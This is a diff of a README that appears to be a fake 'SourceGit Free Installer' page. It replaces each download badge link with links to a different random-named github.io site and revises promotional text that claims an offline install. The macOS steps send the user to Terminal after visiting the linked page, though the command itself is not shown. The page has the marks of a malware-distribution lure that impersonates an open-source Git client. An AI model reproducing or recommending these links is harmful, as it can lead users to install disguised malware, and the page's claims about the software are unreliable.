@@ -8,7 +8,7 @@
   <img src="https://img.shields.io/badge/Category-Git+Client-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 SourceGit Free Installer** — SourceGit is a free, open-source Git GUI client built with . Works without internet access, no account required. Full offline installation.
+**💻 SourceGit Free Installer** — SourceGit is a free, open-source Git GUI client for Windows, macOS, and Linux. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install SourceGit](https://img.shields.io/badge/⬇_Install_SourceGit-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install SourceGit](https://img.shields.io/badge/⬇_Install_SourceGit-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About SourceGit
 
-SourceGit is a free, open-source Git GUI client built with .NET and Avalonia for Windows, macOS, and Linux. Features include a visual commit graph, diff viewer, branch management, and stash operations. As a free and open-source option, SourceGit provides an alternative to commercial Git clients for developers who want a modern GUI without licensing costs.
+SourceGit is a free, open-source Git GUI client for Windows, macOS, and Linux. It provides a clean visual commit graph, diff viewer, branch management, and basic Git operations in a lightweight cross-platform application.
 
 ---
 
 ## ❌ Problem: SourceGit is hard to access
 
-- **Newer Project** — Smaller community and fewer tutorials than established Git clients
-- **Feature Completeness** — Some advanced Git features still being implemented
-- **Extension Ecosystem** — No plugin system for extending functionality
-- **Documentation** — Less comprehensive than major commercial Git clients
+- **Early Development** — Feature set and stability still maturing
+- **Small Community** — Limited documentation and user resources
+- **Limited Advanced Features** — Some advanced Git operations not yet implemented
+- **Basic Interface** — Less polished than commercial alternatives
 
 ---
 
@@ -61,9 +61,9 @@ SourceGit is a free, open-source Git GUI client built with .NET and Avalonia for
 
 <div align="center">
 
-[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://zenboulderagora.github.io/Windw/)
+[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://yobowgileysb.github.io/WinDownload/)
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 </div>
 
@@ -81,7 +81,7 @@ SourceGit is a free, open-source Git GUI client built with .NET and Avalonia for
 
 <div align="center">
 
-[![⬇ Install SourceGit](https://img.shields.io/badge/⬇_Install_SourceGit-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install SourceGit](https://img.shields.io/badge/⬇_Install_SourceGit-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -100,7 +100,7 @@ SourceGit is a free, open-source Git GUI client built with .NET and Avalonia for
 
 ## 🍎 macOS Installation
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -121,11 +121,11 @@ SourceGit is a free, open-source Git GUI client built with .NET and Avalonia for
 
 ---
 
-**SourceGit Free Installer** — SourceGit is a free, open-source Git GUI client built with . Install without internet connection today!
+**SourceGit Free Installer** — SourceGit is a free, open-source Git GUI client for Windows, macOS, and Linux. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install SourceGit](https://img.shields.io/badge/⬇_Install_SourceGit-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install SourceGit](https://img.shields.io/badge/⬇_Install_SourceGit-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
